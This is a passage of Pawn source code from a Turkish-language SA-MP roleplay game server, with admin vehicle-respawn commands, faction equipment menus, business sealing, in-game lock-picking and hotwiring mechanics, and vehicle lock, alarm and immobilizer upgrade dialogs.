	ShowPlayerDialog(playerid, 9832, DIALOG_STYLE_INPUT, "Araç tampon yazýsýný düzenleyin!", "Tampon yazýsýný silmek istiyorsanýz dialogu boþ býrakýn.\nTampon yazýsýný girin:", "Onayla", "Kapat");
	return 1;
}

CMD:mspawn(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 1) return 1;
	new _mid;
	if(sscanf(params,"d",_mid) || _mid > 8) return Kullanim(playerid, "/mspawn [meslekid]"),SendClientMessage(playerid, -1, "Geçerli meslekler: 1(Lojistik), 2(Hafriyat), 3(Pizza), 4(Otobüs), 5(Temizlik), 6(Ehliyet), 7(Kiralýk), 8(Sevkiyat)");
    new u[MAX_VEHICLES];
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(IsPlayerInAnyVehicle(i)) u[GetPlayerVehicleID(i)]=1;
    }
	switch(_mid)
	{
	    case 1:
	    {
	        for(new i;i<MAX_VEHICLES;i++)
	        {
	            if(Arac[i][atip] == 13 && u[i] != 1)
	            {
	                SetVehicleToRespawn(i);
	                Aractamiri(i);
	            }
			}
			Bilgi(playerid, "Lojistik mesleðindeki kullanýlmayan araçlarý spawn ettiniz.");
	    }
	    case 2:
	    {
	        for(new i;i<MAX_VEHICLES;i++)
	        {
	            if(Arac[i][atip] == 11 && u[i] != 1)
	            {
	                SetVehicleToRespawn(i);
	                Aractamiri(i);
	            }
			}
			Bilgi(playerid, "Hafriyat mesleðindeki kullanýlmayan araçlarý spawn ettiniz.");
	    }
	    case 3:
	    {
	        for(new i;i<MAX_VEHICLES;i++)
	        {
	            if(Arac[i][atip] == 6 && u[i] != 1)
	            {
	                SetVehicleToRespawn(i);
	                Aractamiri(i);
	            }
			}
			Bilgi(playerid, "Pizzacýlýk mesleðindeki kullanýlmayan araçlarý spawn ettiniz.");
	    }
	    case 4:
	    {
	        for(new i;i<MAX_VEHICLES;i++)
	        {
	            if(GetVehicleModel(i) == 437 && u[i] != 1)
	            {
	                SetVehicleToRespawn(i);
	                Aractamiri(i);
	            }
			}
			Bilgi(playerid, "Otobüscülük mesleðindeki kullanýlmayan araçlarý spawn ettiniz.");
	    }
	    case 5:
	    {
	        for(new i;i<MAX_VEHICLES;i++)
	        {
	            if(Arac[i][atip] == 9 && u[i] != 1)
	            {
	                SetVehicleToRespawn(i);
	                Aractamiri(i);
	            }
			}
			Bilgi(playerid, "Temizlikçilik mesleðindeki kullanýlmayan araçlarý spawn ettiniz.");
	    }
	    case 6:
	    {
	        for(new i;i<MAX_VEHICLES;i++)
	        {
	            if(Arac[i][atip] == 8 && u[i] != 1)
	            {
	                SetVehicleToRespawn(i);
	                Aractamiri(i);
	            }
			}
			Bilgi(playerid, "Kullanýlmayan ehliyet araçlarýný spawn ettiniz.");
	    }
	    case 7:
	    {
	        for(new i;i<MAX_VEHICLES;i++)
	        {
	            if(Arac[i][atip] == 5 && u[i] != 1)
	            {
	                SetVehicleToRespawn(i);
	                Aractamiri(i);
	            }
			}
			Bilgi(playerid, "Kullanýlmayan kiralýk araçlarý spawn ettiniz.");
	    }
	    case 8:
	    {
	        for(new i;i<MAX_VEHICLES;i++)
	        {
	            if(Arac[i][atip] == 10 && u[i] != 1)
	            {
	                SetVehicleToRespawn(i);
	                Aractamiri(i);
	            }
			}
			Bilgi(playerid, "Kullanýlmayan sevkiyat araçlarýný spawn ettiniz.");
	    }
	}
	return 1;
}

CMD:ekipman(playerid, params[])
{
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != LSPD || !Karakter[playerid][isbasi]) return 1;
	if(IsPlayerInAnyVehicle(playerid))
 	{
	  	Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	  	return 1;
	}
	new veh = GetNearestVehicle(playerid);
	if(!IsPlayerNearBoot(playerid, veh)) return Hata(playerid, "Aracýn bagajýnda deðilsiniz.");
	if(Arac[veh][abirliktip] != LSPD) return Hata(playerid, "Bu araçta bu komutu kullanamazsýn.");
	ShowPlayerDialog(playerid, 308, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Araç Ekipman", " Cop\n Biber Gazý\n Desert Eagle\n MP5\n Shotgun\n M4\n Ýç Yelek\n Operasyon Yeleði\n Ekipman Býrak", "Onayla", "Kapat");
	return 1;
}

CMD:fbiekipman(playerid, params[])
{
    if(IsPlayerInAnyVehicle(playerid))
 	{
	  	Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	  	return 1;
	}
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != FBI) return 1;
	new veh = GetNearestVehicle(playerid);
	if(!IsPlayerNearBoot(playerid, veh)) return Hata(playerid, "Aracýn bagajýnda deðilsiniz.");
	if(Arac[veh][abirliktip] != FBI) return Hata(playerid, "Bu araçta bu komutu kullanamazsýn.");
	ShowPlayerDialog(playerid, 308, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Araç Ekipman", " Cop\n Biber Gazý\n Desert Eagle\n MP5\n Shotgun\n M4\n Ýç Yelek\n Operasyon Yeleði\n Ekipman Býrak", "Onayla", "Kapat");
	return 1;
}

CMD:fdekipman(playerid, params[])
{
    if(IsPlayerInAnyVehicle(playerid))
 	{
	  	Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	  	return 1;
	}
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != LSFD) return 1;
	new veh = GetNearestVehicle(playerid);
	if(!IsPlayerNearBoot(playerid, veh)) return Hata(playerid, "Aracýn bagajýnda deðilsiniz.");
	if(Arac[veh][abirliktip] != LSFD) return Hata(playerid, "Bu araçta bu komutu kullanamazsýn.");
	ShowPlayerDialog(playerid, 800, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Araç Ekipman", "Kürek\nYangýn Söndürücü\nEkipman Býrak", "Onayla", "Kapat");
	return 1;
}

CMD:muhurle(playerid, params[])
{
    if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != LSPD) return 1;
    if(Karakter[playerid][rutbe] > 12) return Hata(playerid, "Bu komutu kullanmak için yetkiniz yeterli deðil.");
    new mesafe = IsyeriMesafesi(2.0, playerid);
    if(mesafe == 0) return Hata(playerid, "Ýþyerine yakýn deðilsiniz.");
    switch(Isyeri[mesafe][muhur])
	{
	    case 0:
	    {
	        Bilgi(playerid, "Ýþyerini mühürlediniz.");
			Isyeri[mesafe][muhur] = 1;
			IsyeriKaydet(mesafe);
			IsyeriAyarla(mesafe);
	    }
	    case 1:
	    {
			Bilgi(playerid, "Ýþyerinin mühürünü kaldýrdýnýz.");
			Isyeri[mesafe][muhur] = 0;
			IsyeriKaydet(mesafe);
			IsyeriAyarla(mesafe);
	    }
	}
	return 1;
}

CMD:amuhurle(playerid, params[])
{
    if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 3) return 1;
    new mesafe = IsyeriMesafesi(2.0, playerid);
    if(mesafe == 0) return Hata(playerid, "Ýþyerine yakýn deðilsiniz.");
    switch(Isyeri[mesafe][muhur])
	{
	    case 0:
	    {
	        Bilgi(playerid, "Ýþyerini mühürlediniz.");
			Isyeri[mesafe][muhur] = 1;
			IsyeriKaydet(mesafe);
			IsyeriAyarla(mesafe);
	    }
	    case 1:
	    {
			Bilgi(playerid, "Ýþyerinin mühürünü kaldýrdýnýz.");
			Isyeri[mesafe][muhur] = 0;
			IsyeriKaydet(mesafe);
			IsyeriAyarla(mesafe);
	    }
	}
	return 1;
}

CMD:aletcantasi(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	if(Karakter[playerid][level] < 5) return Hata(playerid, "5 seviye altý oyuncular bu komutu kullanamazlar.");
	if(!gToolkit[playerid]) return Hata(playerid, "Alet çantanýz yok.");
	new nstring[16];
	if(sscanf(params,"s[16]",nstring)) return Kullanim(playerid, "/aletcantasi [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kilitkir, duzkontak, birak");
	if(Buysa("kilitkir",nstring))
	{
	    if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinden kilit kýramazsýnýz.");
	    new vid = GetNearestVehicle(playerid);
		if(!AracSayiKontrol(playerid)) return Hata(playerid, "Yakýnýnýzda birden fazla araç bulunmaktadýr.");
      	if(vid != INVALID_VEHICLE_ID)
       	{
       	    if(PolisSay() < 5) return Hata(playerid, "Oyunda 5 aktif polis olmadan kilit kýramazsýnýz.");
	    	if(Arac[vid][atip] != 1 || !IsDoorVehicle(vid)) return Hata(playerid, "Bu aracýn kilidini kýramazsýnýz.");
            if(!Arac[vid][akilit]) return Hata(playerid, "Araç kilitli deðil.");
	    	Bilgi(playerid, "Aracýn kilidini kýrmaya baþladýnýz.");
	    	SetPVarInt(playerid, "KilitKir", Arac[vid][akilittip]*100);
	    	DONDUR(playerid);
	    	new _st[5];
			format(_st, sizeof(_st), "%d", Arac[vid][akilittip]*100);
 			PlayerTextDrawShow(playerid, GeriSayimTD[playerid]);
   			PlayerTextDrawSetString(playerid, GeriSayimTD[playerid], _st);
			ApplyAnimation(playerid, "PED", "CAR_PULLOUT_RHS", 4.1, false, false, false, true, 0, true);
			if(Arac[vid][aalarm] >= 1) AlarmTimer[vid] = SetTimerEx("alarmcal", 3000, true, "i", vid);
			if(Arac[vid][aalarm] >= 2) PolisGonderKilit(vid);
			if(Arac[vid][aalarm] >= 3) SahipGonderKilit(vid);
		}
		else Hata(playerid, "Yakýnýnýzda araç bulunmamaktadýr.");
	}
	else if(Buysa("duzkontak",nstring))
	{
	    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
		new vid = GetPlayerVehicleID(playerid);
		if(!CalinabilirArac(vid)) return Hata(playerid, "Bu araca düz kontak yapamazsýn.");
		if(Arac[vid][atip] != 1 || !IsEngineVehicle(vid)) return Hata(playerid, "Bu araca düz kontak yapamazsýnýz.");
		if(Arac[vid][parcalandi]) return Hata(playerid, "Bu araç zaten parçalanmýþ.");
		Bilgi(playerid, "Araca düz kontak yapmaya baþladýnýz.");
		DONDUR(playerid);
 		PlayerTextDrawShow(playerid, GeriSayimTD[playerid]);
 		new _st[5];
 		if(Arac[vid][aimmo] > 0) {
	 		SetPVarInt(playerid, "DuzKontak", Arac[vid][aimmo]*100);
			format(_st, sizeof(_st), "%d", Arac[vid][aimmo]*100);
	   		PlayerTextDrawSetString(playerid, GeriSayimTD[playerid], _st);
 		} else if(Arac[vid][aimmo] == 0) {
 		    SetPVarInt(playerid, "DuzKontak", 50);
			format(_st, sizeof(_st), "%d", 50);
	   		PlayerTextDrawSetString(playerid, GeriSayimTD[playerid], _st);
 		}
	}
	else if(Buysa("birak",nstring))
	{
	    if(GetPVarInt(playerid, "DuzKontak") == 0 && GetPVarInt(playerid, "KilitKir") == 0) return Hata(playerid, "Herhangi bir þey yapmýyorsunuz.");
		if(GetPVarInt(playerid, "DuzKontak") > 0)
		{
		    Bilgi(playerid, "Düz kontak yapmayý býraktýnýz.");
		    SetPVarInt(playerid, "DuzKontak", 0);
		    PlayerTextDrawHide(playerid, GeriSayimTD[playerid]);
		    COZ(playerid);
		}
		else if(GetPVarInt(playerid, "KilitKir") > 0)
		{
		    Bilgi(playerid, "Kilit kýrmayý yapmayý býraktýnýz.");
		    SetPVarInt(playerid, "KilitKir", 0);
		    PlayerTextDrawHide(playerid, GeriSayimTD[playerid]);
		    COZ(playerid);
		    new vid=GetNearestVehicle(playerid);
			KillTimer(AlarmTimer[vid]);
		}
		ClearAnimations(playerid);
	}
	return 1;
}

SahipGonderKilit(vehicleid)
{
	new _ad[32], nstring[256], Float:vPos[3], _c1, _c2;
	GetVehiclePos(vehicleid, vPos[0], vPos[1], vPos[2]);
	GetVehicleColor(vehicleid, _c1, _c2);
	#pragma unused _c2
	format(_ad, sizeof(_ad), "%s", SQLFromName(Arac[vehicleid][aowner]));
	//strreplace(_ad, " ", "_");
	format(nstring, sizeof(nstring), "[ÝHBAR] "C1"%s tarafýnda %s%s "C1"model aracýnýzýn alarmý çalmaktadýr.",GetLocation(vPos[0], vPos[1], vPos[2]),HexRenkVer(AllCarColors[_c1]),GetVehicleName(vehicleid));
	foreach(new i : Player)
	{
	    if(Buysa(Isim(i), _ad))
	    {
	        SendClientMessage(i, COLOR_LIGHTRED, nstring);
	        break;
	    }
	}
}

PolisGonderSoygun(playerid, isyeridd)
{
	new nstring[256];
	format(nstring, sizeof(nstring), "[ÝHBAR] "C1"%s tarafýnda iþyerinin alarmý çalmaktadýr.",GetLocation(Isyeri[isyeridd][girisX], Isyeri[isyeridd][girisY], Isyeri[isyeridd][girisZ]));
	foreach(new i : Player)
	{
	    if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi])
	    {
	        SendClientMessage(i, COLOR_LIGHTRED, nstring);
	        SetPlayerMapIcon(i, playerid, Isyeri[isyeridd][girisX], Isyeri[isyeridd][girisY], Isyeri[isyeridd][girisZ], 0, COLOR_LIGHTRED, MAPICON_GLOBAL_CHECKPOINT);
            SetTimerEx("SoygunIconKapa", 80000, false, "d", playerid);
		}
	}
}

PolisGonderKilit(vehicleid)
{
	new nstring[256], Float:vPos[3], _c1, _c2;
	GetVehiclePos(vehicleid, vPos[0], vPos[1], vPos[2]);
	GetVehicleColor(vehicleid, _c1, _c2);
	#pragma unused _c2
	format(nstring, sizeof(nstring), "[ÝHBAR] "C1"%s tarafýnda %s%s "C1"model aracýn alarmý çalmaktadýr.",GetLocation(vPos[0], vPos[1], vPos[2]),HexRenkVer(AllCarColors[_c1]),GetVehicleName(vehicleid));
	foreach(new i : Player)
	{
	    if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi])
	    {
	        SendClientMessage(i, COLOR_LIGHTRED, nstring);
		}
	}
}

PolisSay()
{
	new _say;
    foreach(new i : Player)
	{
	    if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi])
	    {
	        _say++;
		}
	}
	return _say;
}

stock GetVehicleColor(vehicleid, &c1, &c2)
{
	if(IsValidVehicle(vehicleid))
	{
	    c1 = acol1[vehicleid];
	    c2 = acol2[vehicleid];
	    return 1;
	}
	return 0;
}

forward alarmcal(vehicleid);
public alarmcal(vehicleid)
{
	new Float:vPos[3];
    GetVehiclePos(vehicleid,vPos[0],vPos[1],vPos[2]);
   	for(new i=0; i<MAX_PLAYERS; i++)
    {
    	PlayerPlaySound(i, 1147, vPos[0],vPos[1],vPos[2]);
   	}
    //SetTimerEx("alarmcal", 3000, false, "i", vehicleid);
    return 1;
}

CMD:ornekdaire(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	new arc = EvMesafesi(3.0, playerid);
	if(arc == 0) return Hata(playerid, "Bu komutu kullanmak için evin önünde olmalýsýnýz.");
	if(Ev[arc][esahip] == Karakter[playerid][sqlid])
	{
	    SetPVarInt(playerid, "IntID", arc);
	    new mstring[2048];
		for(new i;i<MAX_INTERIORS;i++)
	    {
	        if(Interior[i][inttur] == 2)
	        {
	            format(mstring, sizeof(mstring), "%s%s\t"DOLAR"$"C1"%d\n",mstring, Interior[i][intisim], Interior[i][intfiyat]);
			}
	    }
	    format(mstring, sizeof(mstring), "Ýnterior Ýsmi\tFiyat\n%s", mstring);
	    SetPVarInt(playerid, "OrnekMekan", 2);
	    ShowPlayerDialog(playerid, 309, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Örnek Daire", mstring, "Seç", "Ýptal");
	}
	else return Hata(playerid, "Bu evin sahibi deðilsiniz.");
	return 1;
}

CMD:ornekisyeri(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	new mesafe = IsyeriMesafesi(3.0, playerid);
 	if(mesafe == 0) return Hata(playerid, "Bu komutu kullanmak için iþyerinin önünde olmalýsýnýz.");
	if(Isyeri[mesafe][isahip] == Karakter[playerid][sqlid])
	{
	    SetPVarInt(playerid, "IntID", mesafe);
	    new mstring[2048];
		for(new i;i<MAX_INTERIORS;i++)
	    {
	        if(Interior[i][inttur] == 3)
	        {
	            format(mstring, sizeof(mstring), "%s%s\t"DOLAR"$"C1"%d\n",mstring, Interior[i][intisim], Interior[i][intfiyat]);
			}
	    }
	    format(mstring, sizeof(mstring), "Ýnterior Ýsmi\tFiyat\n%s", mstring);
	    SetPVarInt(playerid, "OrnekMekan", 3);
	    ShowPlayerDialog(playerid, 309, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Örnek Ýþyeri", mstring, "Seç", "Ýptal");
	}
	else return Hata(playerid, "Bu iþyerinin sahibi deðilsiniz.");
	return 1;
}

CMD:ornekcik(playerid)
{
    if(!Girdi[playerid]) return 1;
	if(!gMekanGeziyor[playerid]) return Hata(playerid, "Ev veya daire gezmiyorsunuz.");
	GeziPosAyarla(playerid);
	gMekanGeziyor[playerid] = false;
	KillTimer(gMekanTimer[playerid]);
	//Bilgi(playerid, "Çýktýnýz.");
	return 1;
}

GeziPosAyarla(playerid)
{
	DONDUR(playerid);
	new i=GetPVarInt(playerid, "IntID");
	switch(GetPVarInt(playerid, "OrnekMekan"))
	{
	    case 2: {
			SetPlayerPos(playerid, Ev[i][girisX],Ev[i][girisY],Ev[i][girisZ]);
			SetPlayerVirtualWorld(playerid, Ev[i][egirisvw]);
			SetPlayerInterior(playerid, Ev[i][egirisint]);
		}
	    case 3: {
			SetPlayerPos(playerid, Isyeri[i][girisX],Isyeri[i][girisY],Isyeri[i][girisZ]);
			SetPlayerVirtualWorld(playerid, Isyeri[i][igirisvw]);
			SetPlayerInterior(playerid, Isyeri[i][igirisint]);
		}
	}
	SetTimerEx("UnfreezeTimer", 1500, 0, "i", playerid);
}

forward GeziBitir(playerid);
public GeziBitir(playerid)
{
	GeziPosAyarla(playerid);
	gMekanGeziyor[playerid] = false;
	Bilgi(playerid, "Süreniz doldu.");
}

RaporSira(playerid)
{
	new _say;
	foreach(new i : Player)
	{
	    if(Karakter[i][Rapor] == 1)
	    {
	        _say++;
	        if(playerid == i) break;
	    }
	}
	return _say;
}

TamirPos(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 10.0, 1569.5212,-2154.8042,14.0352) && Birlik[Karakter[playerid][birlik]][ftip] == MODIFIYE) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 15.0, 1609.0525,-1831.3256,13.5079) && Birlik[Karakter[playerid][birlik]][ftip] == MODIFIYE) return 1;
	else if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && IsPlayerInRangeOfPoint(playerid, 30.0, 1543.6100,-1706.7184,5.8906)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 15.0, 2072.5754,-1831.3226,13.5469)) return 1;//idlewood
	else if(IsPlayerInRangeOfPoint(playerid, 15.0, 488.2436,-1733.6395,11.1813)) return 1;//santamaria
	else if(IsPlayerInRangeOfPoint(playerid, 15.0, 1024.9271,-1030.5604,32.0420)) return 1;//temple
	else if(IsPlayerInRangeOfPoint(playerid, 15.0, 719.8125,-463.8503,16.3359)) return 1;//dillimore
	else if(IsPlayerInRangeOfPoint(playerid, 20.0, HAVAARAC_POS_X,HAVAARAC_POS_Y,HAVAARAC_POS_Z)) return 1;//hava arac
	return 0;
}

KilitSec(playerid)
{
	new mstring[256];
	new nstring[128];
	new _modelid=SectigiArac[playerid];
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Araç Kilit Seviye [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	switch(SectigiKilit[playerid])
	{
	    case 0: format(mstring, sizeof(mstring), " Kilit Seviye: 0 "C2"(Seçili)\n Kilit Seviye: 1\t["DOLAR"$"C1"500]\n Kilit Seviye: 2\t["DOLAR"$"C1"1000]\n Kilit Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 1: format(mstring, sizeof(mstring), " Kilit Seviye: 0\n Kilit Seviye: 1\t["DOLAR"$"C1"500] "C2"(Seçili)\n Kilit Seviye: 2\t["DOLAR"$"C1"1000]\n Kilit Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 2: format(mstring, sizeof(mstring), " Kilit Seviye: 0\n Kilit Seviye: 1\t["DOLAR"$"C1"500]\n Kilit Seviye: 2\t["DOLAR"$"C1"1000] "C2"(Seçili)\n Kilit Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 3: format(mstring, sizeof(mstring), " Kilit Seviye: 0\n Kilit Seviye: 1\t["DOLAR"$"C1"500]\n Kilit Seviye: 2\t["DOLAR"$"C1"1000]\n Kilit Seviye: 3\t["DOLAR"$"C1"1750] "C2"(Seçili)");
	}
	SetPVarInt(playerid, "NeSeciyor", 1);
	ShowPlayerDialog(playerid, 311, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "");
}

AlarmSec(playerid)
{
	new mstring[256];
	new nstring[128];
	new _modelid=SectigiArac[playerid];
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Araç Alarm Seviye [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	switch(SectigiAlarm[playerid])
	{
	    case 0: format(mstring, sizeof(mstring), " Alarm Seviye: 0 "C2"(Seçili)\n Alarm Seviye: 1\t["DOLAR"$"C1"500]\n Alarm Seviye: 2\t["DOLAR"$"C1"1000]\n Alarm Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 1: format(mstring, sizeof(mstring), " Alarm Seviye: 0\n Alarm Seviye: 1\t["DOLAR"$"C1"500] "C2"(Seçili)\n Alarm Seviye: 2\t["DOLAR"$"C1"1000]\n Alarm Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 2: format(mstring, sizeof(mstring), " Alarm Seviye: 0\n Alarm Seviye: 1\t["DOLAR"$"C1"500]\n Alarm Seviye: 2\t["DOLAR"$"C1"1000] "C2"(Seçili)\n Alarm Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 3: format(mstring, sizeof(mstring), " Alarm Seviye: 0\n Alarm Seviye: 1\t["DOLAR"$"C1"500]\n Alarm Seviye: 2\t["DOLAR"$"C1"1000]\n Alarm Seviye: 3\t["DOLAR"$"C1"1750] "C2"(Seçili)");
	}
	SetPVarInt(playerid, "NeSeciyor", 2);
	ShowPlayerDialog(playerid, 311, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "");
}

ImmoSec(playerid)
{
	new mstring[256];
	new nstring[128];
	new _modelid=SectigiArac[playerid];
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Araç Immobilizer Seviye [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	switch(SectigiImmo[playerid])
	{
	    case 0: format(mstring, sizeof(mstring), " Immobilizer Seviye: 0 "C2"(Seçili)\n Immobilizer Seviye: 1\t["DOLAR"$"C1"500]\n Immobilizer Seviye: 2\t["DOLAR"$"C1"1000]\n Immobilizer Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 1: format(mstring, sizeof(mstring), " Immobilizer Seviye: 0\n Immobilizer Seviye: 1\t["DOLAR"$"C1"500] "C2"(Seçili)\n Immobilizer Seviye: 2\t["DOLAR"$"C1"1000]\n Immobilizer Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 2: format(mstring, sizeof(mstring), " Immobilizer Seviye: 0\n Immobilizer Seviye: 1\t["DOLAR"$"C1"500]\n Immobilizer Seviye: 2\t["DOLAR"$"C1"1000] "C2"(Seçili)\n Immobilizer Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 3: format(mstring, sizeof(mstring), " Immobilizer Seviye: 0\n Immobilizer Seviye: 1\t["DOLAR"$"C1"500]\n Immobilizer Seviye: 2\t["DOLAR"$"C1"1000]\n Immobilizer Seviye: 3\t["DOLAR"$"C1"1750] "C2"(Seçili)");
	}
	SetPVarInt(playerid, "NeSeciyor", 3);
	ShowPlayerDialog(playerid, 311, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "");
}

KilitSecEx(playerid)
{
	new mstring[256];
	new nstring[128];
	new _modelid=GetVehicleModel(GetPlayerVehicleID(playerid));
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Araç Kilit Seviye [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	switch(SectigiKilit[playerid])
	{
	    case 0: format(mstring, sizeof(mstring), " Kilit Seviye: 0 "C2"(Seçili)\n Kilit Seviye: 1\t["DOLAR"$"C1"500]\n Kilit Seviye: 2\t["DOLAR"$"C1"1000]\n Kilit Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 1: format(mstring, sizeof(mstring), " Kilit Seviye: 0\n Kilit Seviye: 1\t["DOLAR"$"C1"500] "C2"(Seçili)\n Kilit Seviye: 2\t["DOLAR"$"C1"1000]\n Kilit Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 2: format(mstring, sizeof(mstring), " Kilit Seviye: 0\n Kilit Seviye: 1\t["DOLAR"$"C1"500]\n Kilit Seviye: 2\t["DOLAR"$"C1"1000] "C2"(Seçili)\n Kilit Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 3: format(mstring, sizeof(mstring), " Kilit Seviye: 0\n Kilit Seviye: 1\t["DOLAR"$"C1"500]\n Kilit Seviye: 2\t["DOLAR"$"C1"1000]\n Kilit Seviye: 3\t["DOLAR"$"C1"1750] "C2"(Seçili)");
	}
	SetPVarInt(playerid, "NeSeciyor", 1);
	ShowPlayerDialog(playerid, 312, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "");
}

AlarmSecEx(playerid)
{
	new mstring[256];
	new nstring[128];
	new _modelid=GetVehicleModel(GetPlayerVehicleID(playerid));
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Araç Alarm Seviye [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	switch(SectigiAlarm[playerid])
	{
	    case 0: format(mstring, sizeof(mstring), " Alarm Seviye: 0 "C2"(Seçili)\n Alarm Seviye: 1\t["DOLAR"$"C1"500]\n Alarm Seviye: 2\t["DOLAR"$"C1"1000]\n Alarm Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 1: format(mstring, sizeof(mstring), " Alarm Seviye: 0\n Alarm Seviye: 1\t["DOLAR"$"C1"500] "C2"(Seçili)\n Alarm Seviye: 2\t["DOLAR"$"C1"1000]\n Alarm Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 2: format(mstring, sizeof(mstring), " Alarm Seviye: 0\n Alarm Seviye: 1\t["DOLAR"$"C1"500]\n Alarm Seviye: 2\t["DOLAR"$"C1"1000] "C2"(Seçili)\n Alarm Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 3: format(mstring, sizeof(mstring), " Alarm Seviye: 0\n Alarm Seviye: 1\t["DOLAR"$"C1"500]\n Alarm Seviye: 2\t["DOLAR"$"C1"1000]\n Alarm Seviye: 3\t["DOLAR"$"C1"1750] "C2"(Seçili)");
	}
	SetPVarInt(playerid, "NeSeciyor", 2);
	ShowPlayerDialog(playerid, 312, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "");
}

ImmoSecEx(playerid)
{
	new mstring[256];
	new nstring[128];
	new _modelid=GetVehicleModel(GetPlayerVehicleID(playerid));
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Araç Immobilizer Seviye [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	switch(SectigiImmo[playerid])
	{
	    case 0: format(mstring, sizeof(mstring), " Immobilizer Seviye: 0 "C2"(Seçili)\n Immobilizer Seviye: 1\t["DOLAR"$"C1"500]\n Immobilizer Seviye: 2\t["DOLAR"$"C1"1000]\n Immobilizer Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 1: format(mstring, sizeof(mstring), " Immobilizer Seviye: 0\n Immobilizer Seviye: 1\t["DOLAR"$"C1"500] "C2"(Seçili)\n Immobilizer Seviye: 2\t["DOLAR"$"C1"1000]\n Immobilizer Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 2: format(mstring, sizeof(mstring), " Immobilizer Seviye: 0\n Immobilizer Seviye: 1\t["DOLAR"$"C1"500]\n Immobilizer Seviye: 2\t["DOLAR"$"C1"1000] "C2"(Seçili)\n Immobilizer Seviye: 3\t["DOLAR"$"C1"1750]");
	    case 3: format(mstring, sizeof(mstring), " Immobilizer Seviye: 0\n Immobilizer Seviye: 1\t["DOLAR"$"C1"500]\n Immobilizer Seviye: 2\t["DOLAR"$"C1"1000]\n Immobilizer Seviye: 3\t["DOLAR"$"C1"1750] "C2"(Seçili)");
	}
	SetPVarInt(playerid, "NeSeciyor", 3);
	ShowPlayerDialog(playerid, 312, DIALOG_STYLE_LIST, nstring, mstring, "Seç", "");
}

AracGelistir(playerid)
{
    new nstring[128],__fiyat,_modelid;
    _modelid=GetVehicleModel(GetPlayerVehicleID(playerid));
	format(nstring, sizeof(nstring), ""C7"EIGHTBORN - "C8"Araç Geliþtirme [ {B3B3B3}%s(%d) {FFFFFF}]", VehicleName[_modelid-400][0], _modelid);
	new mstring[512];
	if(Arac[GetPlayerVehicleID(playerid)][ahizsabit] == 0)
	{
		switch(SectigiHizSabit[playerid])
		{
		    case 1: __fiyat += 3500;
		}
	}
	if(SectigiKilit[playerid] > Arac[GetPlayerVehicleID(playerid)][akilittip])
	{
		switch(SectigiKilit[playerid])
		{
		    case 1: __fiyat += 500;
		    case 2: __fiyat += 1000;
		    case 3: __fiyat += 1750;
		}
	}
	if(SectigiAlarm[playerid] > Arac[GetPlayerVehicleID(playerid)][aalarm])
	{
		switch(SectigiAlarm[playerid])
		{
		    case 1: __fiyat += 500;
		    case 2: __fiyat += 1000;
		    case 3: __fiyat += 1750;
		}
